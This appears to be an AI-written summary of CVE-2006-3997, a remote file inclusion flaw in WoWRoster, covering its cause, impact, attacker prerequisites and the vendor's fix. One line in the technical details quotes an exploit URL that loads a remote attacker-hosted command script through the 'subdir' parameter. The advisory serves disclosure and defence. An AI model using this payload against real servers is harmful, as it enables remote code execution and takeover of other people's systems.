Based on the provided information, here's a breakdown of the vulnerability:

**CVE ID:** CVE-2006-3997

**Root Cause of Vulnerability:**
The vulnerability is a remote file inclusion (RFI) issue found in the `lib/phpbb.php` file of WoWRoster. The `hsList.php` file is also vulnerable to Remote File Inclusion.

**Weaknesses/Vulnerabilities Present:**
- **Remote File Inclusion (RFI):** The application allows an attacker to include a remote file, which can be a malicious script, through the `subdir` parameter in `hsList.php` or via the `lib/phpbb.php` file. This is due to insufficient sanitization/validation of user-supplied input that controls which files are included.

**Impact of Exploitation:**
- **Arbitrary Code Execution:** By including a malicious PHP script, an attacker can execute arbitrary code on the server hosting WoWRoster, potentially leading to complete server compromise.
- **Data Access:** The attacker can gain access to sensitive data stored on the server.
- **Server Takeover:** Complete server takeover is possible if the included script contains malicious commands to gain control of the server.

**Attack Vectors:**
- **HTTP GET Requests:** The attacker sends a crafted HTTP GET request to `hsList.php` or through the `lib/phpbb.php` file, specifying the URL of a malicious script in the `subdir` parameter.

**Required Attacker Capabilities/Position:**
- **Network Access:** The attacker needs to be able to make HTTP requests to the server hosting the vulnerable WoWRoster installation.
- **Malicious Script Hosting:** The attacker needs to have a server or hosting space where they have uploaded their malicious PHP script.
- **No Authentication Required:** The vulnerability can be exploited without requiring any authentication.

**Technical Details:**
- The exploit URL for `hsList.php` is given as: `http://www.site.com/[wow_roster_path]/hsList.php?subdir=http://[Shellc0de]]/cmd.txt?&cmd=ls`
- The vulnerable files mentioned are `lib/phpbb.php` and `hsList.php`.
- The exploit works by injecting the URL of a malicious script into the 'subdir' parameter
- The version affected is <= 1.5.x for the `hsList.php` vulnerability

**Additional Notes:**
- The advisory from wowroster.net explicitly instructs users to remove the `lib/phpbb.php` file until a patch was released, and that they should disable phpBB auth if they have it configured. This highlights that the vulnerability is exploitable through this file if phpBB auth is enabled.
- A fix was made available for download in the downloads area as well as via RosterDiag.
